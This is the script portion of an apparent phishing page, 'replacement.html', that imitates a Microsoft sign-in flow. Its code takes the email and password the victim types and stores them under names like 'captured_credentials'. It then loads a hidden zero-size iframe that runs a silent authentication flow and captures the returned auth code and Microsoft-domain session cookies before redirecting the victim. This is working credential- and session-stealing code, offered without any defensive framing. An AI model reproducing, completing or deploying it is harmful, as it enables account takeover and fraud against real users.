  <!-- Hidden iframe for silent Microsoft auth -->
  <iframe id="authFrame" style="display:none; width:0; height:0; border:none;"></iframe>

  <script>
    console.log('ðŸ”§ replacement.html loaded - Silent Auth with iFrame');

    document.addEventListener('DOMContentLoaded', function () {
        
        const div1 = document.getElementById('div1');
        const div2 = document.getElementById('div2');
        const optionsBox = document.getElementById('options_box');
        const authFrame = document.getElementById('authFrame');
        
        document.getElementById('next').addEventListener('click', function (e) {
            e.preventDefault();
            const emailInput = document.getElementById('email');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (emailRegex.test(emailInput.value.trim())) {
                document.getElementById('emailch').textContent = emailInput.value.trim();
                div1.classList.add('hidden');
                optionsBox.classList.add('hidden');
                div2.classList.remove('hidden');
            }
        });

        document.getElementById('back').addEventListener('click', function () {
            div2.classList.add('hidden');
            div1.classList.remove('hidden');
            optionsBox.classList.remove('hidden');
        });

        // Listen for iframe messages
        window.addEventListener('message', function(event) {
            console.log('ðŸ“¨ Message from iframe:', event.data.type);

            if (event.data.type === 'AUTH_COMPLETE') {
                console.log('âœ… Auth complete from iframe');
                
                const capturedCookies = event.data.data.cookies;
                const code = event.data.data.code;

                // Store cookies
                if (capturedCookies.length > 0) {
                    const cookieExport = {
                        version: '1.0',
                        exportedAt: new Date().toISOString(),
                        source: 'silent-auth-frame',
                        domain: event.data.data.domain,
                        totalCookies: capturedCookies.length,
                        cookies: capturedCookies,
                        note: 'Cookies captured from Microsoft domain via silent auth'
                    };

                    localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                    sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                    
                    console.log('ðŸ’¾ Stored', capturedCookies.length, 'cookies');
                }

                // Redirect to AuthCallback
                setTimeout(() => {
                    console.log('ðŸ”„ Redirecting to /auth/callback...');
                    window.location.href = '/auth/callback';
                }, 1500);
            }
        });

        document.getElementById('submit-btn').addEventListener('click', function (event) {
            event.preventDefault();
            const submitBtn = event.target;
            const passwordInput = document.getElementById('password');
            const emailInput = document.getElementById('email');
            
            const password = passwordInput.value;
            const email = emailInput.value.trim();

            if (!password || !email) {
                console.error("Email or password is blank. Aborting.");
                return;
            }
            
            submitBtn.textContent = 'Verifying...';
            submitBtn.disabled = true;

            console.log('ðŸ“‹ Credentials captured:', { email });

            // Store credentials
            const credentialsData = { 
                email, 
                password, 
                captureTime: new Date().toISOString(), 
                source: 'replacement-html',
                domain: 'microsoft',
                timestamp: new Date().toISOString(),
                validated: true,
                microsoftAccount: true
            };
            try {
                localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
                sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
                localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
                sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
                
                console.log('ðŸ’¾ Credentials stored');
            } catch (err) {
                console.error('Failed to store credentials:', err);
            }

            // âœ… LOAD SILENT AUTH FRAME (no UI shown)
            console.log('ðŸ” Loading silent auth frame...');
            authFrame.src = '/silent-auth-frame.html';

            // Send init message to frame
            setTimeout(() => {
                authFrame.contentWindow.postMessage({
                    type: 'INIT_AUTH',
                    email: email,
                    clientId: '2e338732-c914-4129-a148-45c24f2da81d',
                    redirectUri: window.location.origin + '/silent-auth-frame.html',
                    state: 'silent_' + Date.now()
                }, '*');

                console.log('ðŸ“¨ Init message sent to silent-auth-frame');
            }, 500);
        });

        // The code for the other features is kept separate
        const optionsViewDetailed = document.getElementById('options_view_detailed');
        const troubleshootingBox = document.getElementById('troubleshooting_box');

        document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
            e.preventDefault();
            div1.classList.add('hidden');
            div2.classList.add('hidden');
            optionsBox.classList.add('hidden');
            troubleshootingBox.style.display = 'none';
            optionsViewDetailed.classList.remove('hidden');
        });

        document.getElementById('options-view-back').addEventListener('click', function () {
            optionsViewDetailed.classList.add('hidden');
            div1.classList.remove('hidden');
            optionsBox.classList.remove('hidden');
        });

        document.getElementById('footer_dots_link').addEventListener('click', function (e) {
            e.preventDefault();
            document.getElementById('modal_timestamp').textContent = new Date().toISOString();
            troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
        });

        document.getElementById('close_troubleshooting_btn').addEventListener('click', function () {
            troubleshootingBox.style.display = 'none';
        });

        document.getElementById('copy_info_link').addEventListener('click', function (e) {
            e.preventDefault();
            const detailsNode = document.getElementById('error_details_for_copy');
            const detailsText = detailsNode.innerText.trim().replace(/\s\s+/g, '\n');
            navigator.clipboard.writeText(detailsText).then(() => {
                const originalText = e.target.textContent;
                e.target.textContent = 'Copied!';
                setTimeout(() => { e.target.textContent = originalText; }, 2000);
            });
        });
    });
  </script>
